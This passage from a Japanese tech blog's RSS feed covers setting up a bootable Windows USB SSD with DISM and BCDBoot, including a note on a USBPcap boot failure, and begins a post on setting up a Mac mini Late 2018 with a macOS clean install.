&lt;h3 id=&quot;dismとは&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#dism%E3%81%A8%E3%81%AF&quot; aria-label=&quot;dismとは permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;DISMとは&lt;/h3&gt;
&lt;p&gt;DISMは、イメージの展開と管理を行うことができるツールです。&lt;/p&gt;
&lt;p&gt;DISMによってWindowsイメージや仮想ハードディスクが作成されます。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://docs.microsoft.com/ja-jp/windows-hardware/manufacture/desktop/what-is-dism?view=windows-11&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;DISM の概要 | Microsoft Docs&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;今回は&lt;code class=&quot;language-text&quot;&gt;Apply-Image&lt;/code&gt;オプションを使用しています。&lt;/p&gt;
&lt;p&gt;これは、指定した領域にWindowsイメージを配置するオプションです。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://docs.microsoft.com/ja-jp/powershell/module/dism/expand-windowsimage?view=windowsserver2022-ps&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Expand-WindowsImage (DISM) | Microsoft Docs&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;今回は&lt;code class=&quot;language-text&quot;&gt;ImageFile&lt;/code&gt;オプションの引数にISO内の&lt;code class=&quot;language-text&quot;&gt;\sources\install.wim&lt;/code&gt;を与え、先ほど初期化したディスクのフリー領域に配置しています。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;Index&lt;/code&gt;オプションは1を指定しており、&lt;code class=&quot;language-text&quot;&gt;install.wim&lt;/code&gt;のインデックス1にあるデータを配置することを指定しています。&lt;/p&gt;
&lt;h3 id=&quot;bcdbootでシステムパーティションを作成する&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#bcdboot%E3%81%A7%E3%82%B7%E3%82%B9%E3%83%86%E3%83%A0%E3%83%91%E3%83%BC%E3%83%86%E3%82%A3%E3%82%B7%E3%83%A7%E3%83%B3%E3%82%92%E4%BD%9C%E6%88%90%E3%81%99%E3%82%8B&quot; aria-label=&quot;bcdbootでシステムパーティションを作成する permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;BCDBootでシステムパーティションを作成する&lt;/h3&gt;
&lt;p&gt;最後に&lt;code class=&quot;language-text&quot;&gt;BCDBoot&lt;/code&gt;を実行してシステムパーティションを作成します。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;BCDBoot&lt;/code&gt;の第1引数にはブート環境のソースとして使用するWindowsフォルダを指定します。&lt;/p&gt;
&lt;p&gt;今回は先ほどDISMで配置したイメージのWindowsフォルダを指定しています。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;/l&lt;/code&gt;はロケール指定のオプションです。今回は&lt;code class=&quot;language-text&quot;&gt;ja-JP&lt;/code&gt;を指定しています。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;/s &amp;lt;ボリューム文字&gt;&lt;/code&gt;のオプションではシステムパーティションに使用するパーティションのドライブ文字を指定します。&lt;/p&gt;
&lt;p&gt;ここでは、システムパーティション用に600MBで初期化したパーティションを指定します。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;/f&lt;/code&gt;オプションはファームウェアの指定です。&lt;/p&gt;
&lt;p&gt;今回のように&lt;code class=&quot;language-text&quot;&gt;ALL&lt;/code&gt;を入れておけばBIOSにもUEFIにも対応させることができます。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://docs.microsoft.com/ja-jp/windows-hardware/manufacture/desktop/bcdboot-command-line-options-techref-di?view=windows-11&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;BCDBoot のコマンド ライン オプション | Microsoft Docs&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;まとめ&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%81%BE%E3%81%A8%E3%82%81&quot; aria-label=&quot;まとめ permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;まとめ&lt;/h2&gt;
&lt;p&gt;これでUSBからブート可能なWindowsのディスクを作成することができました。&lt;/p&gt;
&lt;p&gt;USB 3.1 Gen1でPCとSSDを接続して起動してみましたが、十分に速度が出ているので、体感的には内臓のSSDにインストールされているOSとそこまで遜色ない使用感です。&lt;/p&gt;
&lt;p&gt;ベンチでこれだけ出てれば上出来ですね。普通に快適に使えます。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 692px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/164d445b48a5f8760888417208818cf5/91e7e/image-20220303235640818.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 73.33333333333334%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAPCAYAAADkmO9VAAAACXBIWXMAAAsTAAALEwEAmpwYAAAD2klEQVQ4yzWTyW9bVRTG/X/AngUsKlViUYYVSAgQqAUJoUKFxAY2hbbAAqkIIWjipmJQEkinkKZOardJ26RpUjfBTpPg2k5iu55Sx1MSv9jPw/PwPPvZ/nFj4Oh++u75zrlX5+qeo/vZv8XyXgLzVgpzcJ/FkMxSON3DgW8NK7izbTbTGu5MG5dgT6aDS9bYSDZxpwRLTTZ2q8z6FHTrMZmaIlEp5EhLO1RKOdS8TEmRKWSTNCpFGuUCdFvUy3najQqqkqZSzPV0ra7yv2UqFXT23SLFWk44BfYzKfKFAlklh5Tap1QuU6nWyOSyJOWU0JIk0yniezvEE7so+bxAATmTQS0VCacL6IbSw+ilI/wgv8pm1UC7BnI6STQeRpZlJEkSB2TS2TQ5JStYJr4bI7i9RVktk0gkCEVC5JUMcaWEbmbPyt+qHovSTypv65UuJ7N4vUF8T/041h1kRYUHpmmdHucVFbfbz1NxkWPdjpTc7+l7RfHkKwkj/Z6jDPg/5Xbte0ZaHzDKR4wUjvPZpTe4OD3AE/cT7tyaYcE/xcXuh1zpHGdUO8EXk29x/s+zOBwb3DJNMrtiQ2fcn2Y69TnT6a9ZrpznfuMM843TzKlnGPeeZNV3m+1QBJ8ngEda5X7zlIiLnNoZJrZPYg0aRDyG1+PCFgihM+w+4HLgS64Ev8NSHWW2pWeuM8AdtQ/93dOM3xzD4/Zwd2oGW9jKPRGba59ntq7n16VvGBkfxOncxDw/h9m+gW4sOcpY5l2u5T7mXvUUhuYxbrSPcS3/Hj9Z3mbqwVU2nC4s5mXsO/Nc144y2TrGZON99LY3uXqnD/vjTdZWrFhdXnRTOzaMvnOYgoPY1RkeNa+zqk2wpI5iDkzg9T0hISVw2Jw4wzZWNAMrLQPW6hgPtsewO9aIxXcI+L2sio/UDUu/oY8d5oL0GsbqJwy1jnCx8woXSofoW34Hh91JYMvPmuUxc95xfu++xB/ayww2XqTf+TrTU1OsrK5hWXrIvM2Bbm7XI8ZsjMXoLbzqIzxNM+v1e+y3fdSqJYJbgV6F0XCMaDqEq7mAu7GAt7VIoSYRCUdEXGInEmYjHEd3IdnPV6Fn+TZ2iEuVo/RpL3C29QzL3XMUM3WGRoZZWHzI+KiRm67L9PE8Pzaf4xcOE0ytYDLNYLb8xdDgIKbFZXR++aApo7Q7cbrtPTqdg30YOikxv9p/U9oU6IqlonUidLrRHqD8r47W44wqRm/AV+d2vM2NSBtjVMMo2BTpCL/JRLiCYbvC5HZV9NwB1zGFOhi3RF5QYzIgdH+ZCV8Zk8CgU+Ef/tv2kiwXWHwAAAAASUVORK5CYII=&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/164d445b48a5f8760888417208818cf5/8ac56/image-20220303235640818.webp 240w,
/static/164d445b48a5f8760888417208818cf5/d3be9/image-20220303235640818.webp 480w,
/static/164d445b48a5f8760888417208818cf5/f686e/image-20220303235640818.webp 692w&quot;
              sizes=&quot;(max-width: 692px) 100vw, 692px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/164d445b48a5f8760888417208818cf5/8ff5a/image-20220303235640818.png 240w,
/static/164d445b48a5f8760888417208818cf5/e85cb/image-20220303235640818.png 480w,
/static/164d445b48a5f8760888417208818cf5/91e7e/image-20220303235640818.png 692w&quot;
            sizes=&quot;(max-width: 692px) 100vw, 692px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/164d445b48a5f8760888417208818cf5/91e7e/image-20220303235640818.png&quot;
            alt=&quot;image-20220303235640818&quot;
            title=&quot;image-20220303235640818&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;今までツール任せにしていたブート構成を手動で作成してみたので結構勉強になりました。&lt;/p&gt;
&lt;h2 id=&quot;追記usbpcapをインストールするとosが起動しなくなる問題&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E8%BF%BD%E8%A8%98usbpcap%E3%82%92%E3%82%A4%E3%83%B3%E3%82%B9%E3%83%88%E3%83%BC%E3%83%AB%E3%81%99%E3%82%8B%E3%81%A8os%E3%81%8C%E8%B5%B7%E5%8B%95%E3%81%97%E3%81%AA%E3%81%8F%E3%81%AA%E3%82%8B%E5%95%8F%E9%A1%8C&quot; aria-label=&quot;追記usbpcapをインストールするとosが起動しなくなる問題 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;追記：USBPcapをインストールするとOSが起動しなくなる問題&lt;/h2&gt;
&lt;p&gt;USB接続したSSDに&lt;code class=&quot;language-text&quot;&gt;USBPcap&lt;/code&gt;をインストールして再起動すると、OS起動時に「自動修復中」の表示になり起動しない問題が発生しました。&lt;/p&gt;
&lt;p&gt;残念ながら、外部接続したSSDからインストール時に作成された以下のフォルダとレジストリをすべて削除してみたものの、起動に失敗する問題は解消されませんでした。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;%ProgramFiles%\USBPcap&lt;/li&gt;
&lt;li&gt;C:\Windows\System32\drivers\USBPcap.sys&lt;/li&gt;
&lt;li&gt;HKLM\System\CurrentControlSet\Services\USBPcap&lt;/li&gt;
&lt;li&gt;HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\USBPcap&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;確認した限りでは上記を削除すればUSBPcapのインストール前の状態に戻せそうな気がするのですが、いまいち原因がわかりませんね。&lt;/p&gt;
&lt;p&gt;システムファイルを書き換えてるとは考えにくいですが、現状この問題が発生した場合は起動SSDの再セットアップ以外に解消方法が見つかりませんでした。&lt;/p&gt;</content:encoded></item><item><title><![CDATA[Mac mini Late2018を購入したのでVMWare Fusion PlayerでMacOSの仮想マシンを構築してみた]]></title><link>https://kashiwaba-yuki.com/note-setup-macmini</link><guid isPermaLink="false">https://kashiwaba-yuki.com/note-setup-macmini</guid><pubDate>Sat, 26 Feb 2022 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;先日初めてのMac端末を手に入れたのでセットアップ手順やつまづいた点について記録しておきます。&lt;/p&gt;
&lt;p&gt;今回はMac mini(Late2018)で以下のような環境をセットアップしていきます。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Mac miniにインストールしたMacOSを現在最新のMonterey 12.2.1にアップグレードする&lt;/li&gt;
&lt;li&gt;VMWare fusion playerをインストールしてMacOS Big Surの仮想マシンを構築する&lt;/li&gt;
&lt;li&gt;LAN上のWindowsマシンからVNCでリモートアクセスできるようにする&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;初めてのMac機ということで結構手こずった点もあったのでその辺まとめておきます。&lt;/p&gt;
&lt;!-- omit in toc --&gt;
&lt;h2 id=&quot;もくじ&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%82%82%E3%81%8F%E3%81%98&quot; aria-label=&quot;もくじ permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;もくじ&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#%E7%92%B0%E5%A2%83%E3%81%AB%E3%81%A4%E3%81%84%E3%81%A6&quot;&gt;環境について&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#macos%E3%82%92%E3%82%AF%E3%83%AA%E3%83%BC%E3%83%B3%E3%82%A4%E3%83%B3%E3%82%B9%E3%83%88%E3%83%BC%E3%83%AB%E3%81%99%E3%82%8B&quot;&gt;MacOSをクリーンインストールする&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#mac-os%E3%82%92%E3%82%A2%E3%83%83%E3%83%97%E3%82%B0%E3%83%AC%E3%83%BC%E3%83%89%E3%81%99%E3%82%8B&quot;&gt;Mac OSをアップグレードする&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&quot;#vmware-fusion-player%E3%82%92%E3%82%A4%E3%83%B3%E3%82%B9%E3%83%88%E3%83%BC%E3%83%AB%E3%81%99%E3%82%8B&quot;&gt;VMWare Fusion Playerをインストールする&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#%E4%BB%AE%E6%83%B3%E3%83%9E%E3%82%B7%E3%83%B3%E3%81%AEmacos%E3%83%A9%E3%82%A4%E3%82%BB%E3%83%B3%E3%82%B9%E3%81%AB%E3%81%A4%E3%81%84%E3%81%A6&quot;&gt;仮想マシンのMacOSライセンスについて&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%82%A4%E3%83%B3%E3%82%B9%E3%83%88%E3%83%BC%E3%83%AB%E7%94%A8%E3%81%AEos%E3%82%92%E5%8F%96%E5%BE%97%E3%81%99%E3%82%8B&quot;&gt;インストール用のOSを取得する&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#vnc%E3%82%92%E4%BD%BF%E3%81%A3%E3%81%A6windows%E3%83%9E%E3%82%B7%E3%83%B3%E3%81%8B%E3%82%89%E3%83%AD%E3%83%BC%E3%82%AB%E3%83%AB%E3%83%8D%E3%83%83%E3%83%88%E3%83%AF%E3%83%BC%E3%82%AF%E7%B5%8C%E7%94%B1%E3%81%A7%E3%83%AA%E3%83%A2%E3%83%BC%E3%83%88%E3%82%A2%E3%82%AF%E3%82%BB%E3%82%B9%E3%81%99%E3%82%8B&quot;&gt;VNCを使ってWindowsマシンからローカルネットワーク経由でリモートアクセスする&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%81%BE%E3%81%A8%E3%82%81&quot;&gt;まとめ&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;環境について&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E7%92%B0%E5%A2%83%E3%81%AB%E3%81%A4%E3%81%84%E3%81%A6&quot; aria-label=&quot;環境について permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;環境について&lt;/h2&gt;
&lt;p&gt;今回購入したMac miniのスペックは以下の通りです。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Mac mini Late 2018&lt;/li&gt;
&lt;li&gt;Intel core i3 8100B&lt;/li&gt;
&lt;li&gt;16GB RAM&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 881px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/46874829b33a7188178bc0e0cc89457c/96658/image-20220228213725674.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 55.833333333333336%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAYAAAB/Ca1DAAAACXBIWXMAAAsTAAALEwEAmpwYAAACtUlEQVQozyWRWW8bZRSGfYt60QTUZDzLN5uX8diesT3jLbGdpFlMg5NGSew6SVOlgAilErQkFKksAsENfyOirKGIG674bw+nzsWjkeabeb73vCfz5c5PPIyec778gnF8ybD4BZveBffcb9i2v59xX3vJyPiBlvOKlroiNa9IjCvq+hU1Ic7eEAmZb9tTvq4d8FW4y87iiGb2hJ5+zIb2hFH2c3azzzg1nvKp+ojN6jWtyn+0i//QzL0m9a5pOH9St3+npn6lZr0is7/1ko32Mzqlc7nxhCXzIT3zEWvaU4aLF2xrF+wIp9onHDvfMaj+S6/0N8v5azreH5L6N1L1C4n1Mw1JnpluXLIWvi+jHJEaU1rmCX37jMS+R91dJ/WHdAvb8uM6HWeVJL9HVJgS58dU/cMZZfeA0BkRqc9EOHzBQIQ1fUJDhA3jiKZxTM6MUZaLmTUxdAPL9FAqh6M8PPsGV3AsB9t05VwjMHZk5LXnrFY+IJGEcXZCfSad4ul1LN0hbWzT607wVAGVzbHaH7I2eJdWo087GZBzyvK+IN/alI19Mg+Gl2yl5/TDM1LniJoxoe09Qi2WGaSb3G//RSd4zXr3Q1zLp15t04g6+HZJLglm2HoBU7eITBHejT4mmNsnWphSfmdCaf6QcF4S6RHdeETy9mPeu/Mj69ULgkKFbnOF/tJdOs0+ab1LVE4o5WIMqaauDsislp/g39onuP2AkhDenspzirpTJa60yFtdutqYldoeyvRJa0tEYQNlePhOUXosEBakHtOWRY7JLIePcW/tEsyPJemY0twb8QRHi6UXl0pQpyIp1Jul6L6M254lq4YJSdyh2ViSPnvYtkPTFWG3dIr51hb5uT2Kc4cincyE7oKk0PNYi3nsbBHPKuMLjh7cYJRwBaXJQhakQ81hpXDG/3y7bZgx6q+QAAAAAElFTkSuQmCC&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/46874829b33a7188178bc0e0cc89457c/8ac56/image-20220228213725674.webp 240w,
/static/46874829b33a7188178bc0e0cc89457c/d3be9/image-20220228213725674.webp 480w,
/static/46874829b33a7188178bc0e0cc89457c/8e8eb/image-20220228213725674.webp 881w&quot;
              sizes=&quot;(max-width: 881px) 100vw, 881px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/46874829b33a7188178bc0e0cc89457c/8ff5a/image-20220228213725674.png 240w,
/static/46874829b33a7188178bc0e0cc89457c/e85cb/image-20220228213725674.png 480w,
/static/46874829b33a7188178bc0e0cc89457c/96658/image-20220228213725674.png 881w&quot;
            sizes=&quot;(max-width: 881px) 100vw, 881px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/46874829b33a7188178bc0e0cc89457c/96658/image-20220228213725674.png&quot;
            alt=&quot;image-20220228213725674&quot;
            title=&quot;image-20220228213725674&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;本当はM1チップ搭載のLate2020が欲しかったのですが、VMWare ESXiがまだM1アーキテクチャをサポートしていなかったためLate2018にしました。&lt;/p&gt;
&lt;p&gt;中古で買う予定だったのでLate2014と迷ったのですが、Late2018で一番安いCPUのIntel core i3 8100Bの評価がかなり良く、Late2014のIntel Core i7-4578Uよりもスペックがよさそうだったのでこちらを購入しました。&lt;/p&gt;
&lt;p&gt;中古相場についても、Late2018のi3モデルとLate2014のi7モデルではほとんど価格は変わらなかったです。&lt;/p&gt;
&lt;p&gt;また、Late2018はLate2014と違ってRAMの拡張もできるという点が最終的に決め手になりました。&lt;/p&gt;
&lt;h2 id=&quot;macosをクリーンインストールする&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#macos%E3%82%92%E3%82%AF%E3%83%AA%E3%83%BC%E3%83%B3%E3%82%A4%E3%83%B3%E3%82%B9%E3%83%88%E3%83%BC%E3%83%AB%E3%81%99%E3%82%8B&quot; aria-label=&quot;macosをクリーンインストールする permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;MacOSをクリーンインストールする&lt;/h2&gt;
&lt;p&gt;PCを購入したらまずはクリーンインストールをするのがお作法です。&lt;/p&gt;
&lt;p&gt;MacOSの再インストールは初めてだったので少々戸惑いました。&lt;/p&gt;
&lt;p&gt;MacOSの場合は、WindowsやLinuxのようにブートメディアを作成してBIOSからリセットする方法ではなく、Mac端末に内臓されている復旧ユーティリティからインターネットもしくは復旧メディア経由で再インストールを行います。&lt;/p&gt;
&lt;p&gt;詳しくは以下のリンクが参考になります。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://support.apple.com/ja-jp/HT204904&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;macOS を再インストールする方法 - Apple サポート (日本)&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Windowsキーボードの場合は[Winキー + R]を押しながらMac mini Late2018の電源を付けることで復旧ユーティリティが起動します。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 362px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/a026780da82d130498c68b6f20d52ab9/10600/image-20220228215319901.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 95.41666666666667%; position: relative; bottom: 0; left: 0; background-image: 